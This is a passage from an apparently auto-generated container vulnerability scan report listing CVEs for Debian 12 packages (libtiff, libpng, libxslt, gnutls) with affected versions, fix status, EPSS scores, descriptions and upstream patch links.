<a href="https://scout.docker.com/v/CVE-2025-8534?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2025--8534" src="https://img.shields.io/badge/CVE--2025--8534-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in libtiff 4.6.0. This vulnerability affects the function PS_Lvl2page of the file tools/tiff2ps.c of the component tiff2ps. The manipulation leads to null pointer dereference. It is possible to launch the attack on the local host. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The name of the patch is 6ba36f159fd396ad11bf6b7874554197736ecc8b. It is recommended to apply a patch to fix this issue. One of the maintainers explains, that "[t]his error only occurs if DEFER_STRILE_LOAD (defer-strile-load:BOOL=ON) or TIFFOpen( .. "rD") option is used."

---
- tiff 4.7.1-1 (unimportant)
https://gitlab.com/libtiff/libtiff/-/issues/718
https://gitlab.com/libtiff/libtiff/-/merge_requests/746
https://gitlab.com/libtiff/libtiff/-/commit/6ba36f159fd396ad11bf6b7874554197736ecc8b (v4.7.1rc1)
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8177?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2025--8177" src="https://img.shields.io/badge/CVE--2025--8177-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in LibTIFF up to 4.7.0. It has been rated as critical. This issue affects the function setrow of the file tools/thumbnail.c. The manipulation leads to buffer overflow. An attack has to be approached locally. The patch is named e8c9d6c616b19438695fd829e58ae4fde5bfbc22. It is recommended to apply a patch to fix this issue. This vulnerability only affects products that are no longer supported by the maintainer.

---
- tiff 4.7.1-1 (unimportant)
https://gitlab.com/libtiff/libtiff/-/issues/715
https://gitlab.com/libtiff/libtiff/-/merge_requests/737
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/e8de4dc1f923576dce9d625caeebd93f9db697e1 (v4.7.1rc1)
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8176?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2025--8176" src="https://img.shields.io/badge/CVE--2025--8176-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in LibTIFF up to 4.7.0. It has been declared as critical. This vulnerability affects the function get_histogram of the file tools/tiffmedian.c. The manipulation leads to use after free. The attack needs to be approached locally. The exploit has been disclosed to the public and may be used. The patch is identified as fe10872e53efba9cc36c66ac4ab3b41a839d5172. It is recommended to apply a patch to fix this issue.

---
- tiff 4.7.1-1 (unimportant)
https://gitlab.com/libtiff/libtiff/-/issues/707
https://gitlab.com/libtiff/libtiff/-/merge_requests/727
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/ce46f002eca4148497363f80fab33f9396bcbeda (v4.7.1rc1)
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/ecc4ddbf1f0fed7957d1e20361e37f01907898e0 (v4.7.1rc1)
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/78397815cdf7e9ad79943e00c3f06a6df9bf45c5 (v4.7.1rc1)
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-6228?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2023--6228" src="https://img.shields.io/badge/CVE--2023--6228-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was found in the tiffcp utility distributed by the libtiff package where a crafted TIFF file on processing may cause a heap-based buffer overflow leads to an application crash.

---
- tiff 4.7.0-1 (unimportant)
https://gitlab.com/libtiff/libtiff/-/issues/606
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/1e7d217a323eac701b134afc4ae39b6bdfdbc96a (v4.7.0rc1)
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-3164?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2023--3164" src="https://img.shields.io/badge/CVE--2023--3164-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-buffer-overflow vulnerability was found in LibTIFF, in extractImageSection() at tools/tiffcrop.c:7916 and tools/tiffcrop.c:7801. This flaw allows attackers to cause a denial of service via a crafted tiff file.

---
- tiff 4.7.0-1 (unimportant)
https://gitlab.com/libtiff/libtiff/-/issues/542
https://gitlab.com/libtiff/libtiff/-/merge_requests/595
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/a20298c4785c369469510613dfbc5bf230164fed (v4.7.0rc1)
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-1916?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2023--1916" src="https://img.shields.io/badge/CVE--2023--1916-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in tiffcrop, a program distributed by the libtiff package. A specially crafted tiff file can lead to an out-of-bounds read in the extractImageSection function in tools/tiffcrop.c, resulting in a denial of service and limited information disclosure. This issue affects libtiff versions 4.x.

---
- tiff 4.7.0-1 (unimportant)
https://gitlab.com/libtiff/libtiff/-/issues/536
https://gitlab.com/libtiff/libtiff/-/issues/537
https://gitlab.com/libtiff/libtiff/-/merge_requests/595
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/a20298c4785c369469510613dfbc5bf230164fed (v4.7.0rc1)
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-1210?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2022--1210" src="https://img.shields.io/badge/CVE--2022--1210-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in LibTIFF 4.3.0. Affected by this vulnerability is the TIFF File Handler of tiff2ps. Opening a malicious file leads to a denial of service. The attack can be launched remotely but requires user interaction. The exploit has been disclosed to the public and may be used.

---
- tiff <unfixed> (unimportant)
[bullseye] - tiff <no-dsa> (Minor issue)
[buster] - tiff <no-dsa> (Minor issue)
https://gitlab.com/libtiff/libtiff/-/issues/402
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-10126?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2018--10126" src="https://img.shields.io/badge/CVE--2018--10126-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.459%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ijg-libjpeg before 9d, as used in tiff2pdf (from LibTIFF) and other products, does not check for a NULL pointer at a certain place in jpeg_fdct_16x16 in jfdctint.c.

---
- tiff <unfixed> (unimportant)
http://bugzilla.maptools.org/show_bug.cgi?id=2786
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-16232?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2017--16232" src="https://img.shields.io/badge/CVE--2017--16232-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.705%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

LibTIFF 4.0.8 has multiple memory leak vulnerabilities, which allow attackers to cause a denial of service (memory consumption), as demonstrated by tif_open.c, tif_lzw.c, and tif_aux.c. NOTE: Third parties were unable to reproduce the issue

---
- tiff <unfixed> (unimportant)
http://seclists.org/oss-sec/2017/q4/168
Related commit: https://gitlab.com/libtiff/libtiff/commit/25f9ffa56548c1846c4a1f19308b7f561f7b1ab0
This is actually only a partial fix, but upstream will not fix it completely.
The related commit is included in 4.0.9. The underlying memory-based DOS
would still be present.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-38289?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D4.5.0-6"><img alt="unspecified : CVE--2023--38289" src="https://img.shields.io/badge/CVE--2023--38289-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=4.5.0-6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

REJECTED

---
REJECTED

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-38288?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D4.5.0-6"><img alt="unspecified : CVE--2023--38288" src="https://img.shields.io/badge/CVE--2023--38288-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=4.5.0-6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

REJECTED

---
REJECTED

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libpng1.6</strong> <code>1.6.39-2</code> (deb)</summary>

<small><code>pkg:deb/debian/libpng1.6@1.6.39-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-66293?s=debian&n=libpng1.6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.6.39-2%2Bdeb12u1"><img alt="high : CVE--2025--66293" src="https://img.shields.io/badge/CVE--2025--66293-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.6.39-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.39-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

LIBPNG is a reference library for use in applications that read, create, and manipulate PNG (Portable Network Graphics) raster image files. Prior to 1.6.52, an out-of-bounds read vulnerability in libpng's simplified API allows reading up to 1012 bytes beyond the png_sRGB_base[512] array when processing valid palette PNG images with partial transparency and gamma correction. The PNG files that trigger this vulnerability are valid per the PNG specification; the bug is in libpng's internal state management. Upgrade to libpng 1.6.52 or later.

---
- libpng1.6 1.6.52-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1121877)
https://github.com/pnggroup/libpng/security/advisories/GHSA-9mpm-9pxh-mg4f
Fixed by: https://github.com/pnggroup/libpng/commit/788a624d7387a758ffd5c7ab010f1870dea753a1 (v1.6.52)
Fixed by: https://github.com/pnggroup/libpng/commit/a05a48b756de63e3234ea6b3b938b8f5f862484a (v1.6.52)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-65018?s=debian&n=libpng1.6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.6.39-2%2Bdeb12u1"><img alt="high : CVE--2025--65018" src="https://img.shields.io/badge/CVE--2025--65018-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.6.39-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.39-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

LIBPNG is a reference library for use in applications that read, create, and manipulate PNG (Portable Network Graphics) raster image files. From version 1.6.0 to before 1.6.51, there is a heap buffer overflow vulnerability in the libpng simplified API function png_image_finish_read when processing 16-bit interlaced PNGs with 8-bit output format. Attacker-crafted interlaced PNG files cause heap writes beyond allocated buffer bounds. This issue has been patched in version 1.6.51.

---
- libpng1.6 1.6.51-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1121216)
https://github.com/pnggroup/libpng/security/advisories/GHSA-7wv6-48j4-hj3g
https://github.com/pnggroup/libpng/issues/755
https://github.com/pnggroup/libpng/commit/16b5e3823918840aae65c0a6da57c78a5a496a4d (v1.6.51)
https://github.com/pnggroup/libpng/commit/218612ddd6b17944e21eda56caf8b4bf7779d1ea (v1.6.51)
https://www.openwall.com/lists/oss-security/2025/11/22/1

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-64720?s=debian&n=libpng1.6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.6.39-2%2Bdeb12u1"><img alt="high : CVE--2025--64720" src="https://img.shields.io/badge/CVE--2025--64720-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.6.39-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.39-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.062%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

LIBPNG is a reference library for use in applications that read, create, and manipulate PNG (Portable Network Graphics) raster image files. From version 1.6.0 to before 1.6.51, an out-of-bounds read vulnerability exists in png_image_read_composite when processing palette images with PNG_FLAG_OPTIMIZE_ALPHA enabled. The palette compositing code in png_init_read_transformations incorrectly applies background compositing during premultiplication, violating the invariant component ≤ alpha × 257 required by the simplified PNG API. This issue has been patched in version 1.6.51.

---
- libpng1.6 1.6.51-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1121217)
https://github.com/pnggroup/libpng/security/advisories/GHSA-hfc7-ph9c-wcww
https://github.com/pnggroup/libpng/issues/686
https://github.com/pnggroup/libpng/commit/08da33b4c88cfcd36e5a706558a8d7e0e4773643 (v1.6.51)
https://www.openwall.com/lists/oss-security/2025/11/22/1

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-64506?s=debian&n=libpng1.6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.6.39-2%2Bdeb12u1"><img alt="medium : CVE--2025--64506" src="https://img.shields.io/badge/CVE--2025--64506-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.6.39-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.39-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

LIBPNG is a reference library for use in applications that read, create, and manipulate PNG (Portable Network Graphics) raster image files. From version 1.6.0 to before 1.6.51, a heap buffer over-read vulnerability exists in libpng's png_write_image_8bit function when processing 8-bit images through the simplified write API with convert_to_8bit enabled. The vulnerability affects 8-bit grayscale+alpha, RGB/RGBA, and images with incomplete row data. A conditional guard incorrectly allows 8-bit input to enter code expecting 16-bit input, causing reads up to 2 bytes beyond allocated buffer boundaries. This issue has been patched in version 1.6.51.

---
- libpng1.6 1.6.51-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1121218)
https://github.com/pnggroup/libpng/security/advisories/GHSA-qpr4-xm66-hww6
https://github.com/pnggroup/libpng/pull/749
https://github.com/pnggroup/libpng/commit/2bd84c019c300b78e811743fbcddb67c9d9bf821 (v1.6.51)
https://www.openwall.com/lists/oss-security/2025/11/22/1

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-64505?s=debian&n=libpng1.6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.6.39-2%2Bdeb12u1"><img alt="medium : CVE--2025--64505" src="https://img.shields.io/badge/CVE--2025--64505-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.6.39-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.39-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

LIBPNG is a reference library for use in applications that read, create, and manipulate PNG (Portable Network Graphics) raster image files. Prior to version 1.6.51, a heap buffer over-read vulnerability exists in libpng's png_do_quantize function when processing PNG files with malformed palette indices. The vulnerability occurs when palette_lookup array bounds are not validated against externally-supplied image data, allowing an attacker to craft a PNG file with out-of-range palette indices that trigger out-of-bounds memory access. This issue has been patched in version 1.6.51.

---
- libpng1.6 1.6.51-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1121219)
https://github.com/pnggroup/libpng/security/advisories/GHSA-4952-h5wq-4m42
https://github.com/pnggroup/libpng/pull/748
https://github.com/pnggroup/libpng/commit/6a528eb5fd0dd7f6de1c39d30de0e41473431c37 (v1.6.51)
https://www.openwall.com/lists/oss-security/2025/11/22/1

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-4214?s=debian&n=libpng1.6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.6.39-2%2Bdeb12u1"><img alt="low : CVE--2021--4214" src="https://img.shields.io/badge/CVE--2021--4214-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.6.39-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.223%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap overflow flaw was found in libpngs' pngimage.c program. This flaw allows an attacker with local network access to pass a specially crafted PNG file to the pngimage utility, causing an application to crash, leading to a denial of service.

---
- libpng1.6 <unfixed> (unimportant)
https://github.com/glennrp/libpng/issues/302
Crash in CLI package, not shipped in binary packages

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>libxslt</strong> <code>1.1.35-1</code> (deb)</summary>

<small><code>pkg:deb/debian/libxslt@1.1.35-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-24855?s=debian&n=libxslt&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.1.35-1%2Bdeb12u1"><img alt="high : CVE--2025--24855" src="https://img.shields.io/badge/CVE--2025--24855-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.1.35-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.35-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

numbers.c in libxslt before 1.1.43 has a use-after-free because, in nested XPath evaluations, an XPath context node can be modified but never restored. This is related to xsltNumberFormatGetValue, xsltEvalXPathPredicate, xsltEvalXPathStringNs, and xsltComputeSortResultInternal.

---
- libxslt 1.1.35-1.2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1100566)
https://gitlab.gnome.org/GNOME/libxslt/-/issues/128
Fixed by: https://gitlab.gnome.org/GNOME/libxslt/-/commit/c7c7f1f78dd202a053996fcefe57eb994aec8ef2 (v1.1.43)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-55549?s=debian&n=libxslt&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.1.35-1%2Bdeb12u1"><img alt="high : CVE--2024--55549" src="https://img.shields.io/badge/CVE--2024--55549-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.1.35-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.35-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

xsltGetInheritedNsList in libxslt before 1.1.43 has a use-after-free issue related to exclusion of result prefixes.

---
- libxslt 1.1.35-1.2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1100565)
https://gitlab.gnome.org/GNOME/libxslt/-/issues/127
Fixed by: https://gitlab.gnome.org/GNOME/libxslt/-/commit/46041b65f2fbddf5c284ee1a1332fa2c515c0515 (v1.1.43)
https://project-zero.issues.chromium.org/issues/382015274

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7424?s=debian&n=libxslt&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.1.35-1%2Bdeb12u2"><img alt="high : CVE--2025--7424" src="https://img.shields.io/badge/CVE--2025--7424-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.1.35-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.35-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.095%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the libxslt library. The same memory field, psvi, is used for both stylesheet and input data, which can lead to type confusion during XML transformations. This vulnerability allows an attacker to crash the application or corrupt memory. In some cases, it may lead to denial of service or unexpected behavior.

---
- libxslt 1.1.35-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109123)
https://bugzilla.redhat.com/show_bug.cgi?id=2379228
https://gitlab.gnome.org/GNOME/libxslt/-/issues/139

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-40403?s=debian&n=libxslt&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.1.35-1%2Bdeb12u2"><img alt="low : CVE--2023--40403" src="https://img.shields.io/badge/CVE--2023--40403-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.1.35-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.35-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.108%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The issue was addressed with improved memory handling. This issue is fixed in macOS Ventura 13.6, tvOS 17, iOS 16.7 and iPadOS 16.7, macOS Monterey 12.7, watchOS 10, iOS 17 and iPadOS 17, macOS Sonoma 14. Processing web content may disclose sensitive information.

---
- libxslt 1.1.35-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108074; unimportant)
https://gitlab.gnome.org/GNOME/libxslt/-/issues/94
Fixed by: https://gitlab.gnome.org/GNOME/libxslt/-/commit/82f6cbf8ca61b1f9e00dc04aa3b15d563e7bbc6d (v1.1.38)
Backports: https://gitlab.gnome.org/GNOME/libxslt/-/issues/94#note_1855467
Hardening to improve ASLR, not a security issue by itself

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2015-9019?s=debian&n=libxslt&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.1.35-1%2Bdeb12u3"><img alt="low : CVE--2015--9019" src="https://img.shields.io/badge/CVE--2015--9019-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.1.35-1+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.984%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In libxslt 1.1.29 and earlier, the EXSLT math.random function was not initialized with a random seed during startup, which could cause usage of this function to produce predictable outputs.

---
- libxslt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=859796)
https://bugzilla.gnome.org/show_bug.cgi?id=758400
https://bugzilla.suse.com/show_bug.cgi?id=934119
There's no indication that math.random() in intended to ensure cryptographic
randomness requirements. Proper seeding needs to happen in the application
using libxslt.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 7" src="https://img.shields.io/badge/M-7-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>gnutls28</strong> <code>3.7.9-2</code> (deb)</summary>

<small><code>pkg:deb/debian/gnutls28@3.7.9-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-0567?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u2"><img alt="high : CVE--2024--0567" src="https://img.shields.io/badge/CVE--2024--0567-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.295%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GnuTLS, where a cockpit (which uses gnuTLS) rejects a certificate chain with distributed trust. This issue occurs when validating a certificate chain with cockpit-certificate-ensure. This flaw allows an unauthenticated, remote client or attacker to initiate a denial of service attack.

---
- gnutls28 3.8.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1061045)
[bookworm] - gnutls28 3.7.9-2+deb12u2
[bullseye] - gnutls28 3.7.1-5+deb11u5
[buster] - gnutls28 <not-affected> (Vulnerabity introduced in 3.7)
https://gitlab.com/gnutls/gnutls/-/issues/1521
https://gnutls.org/security-new.html#GNUTLS-SA-2024-01-09
https://lists.gnupg.org/pipermail/gnutls-help/2024-January/004841.html
https://gitlab.com/gnutls/gnutls/-/commit/9edbdaa84e38b1bfb53a7d72c1de44f8de373405 (3.8.3)

</blockquote>
</details>

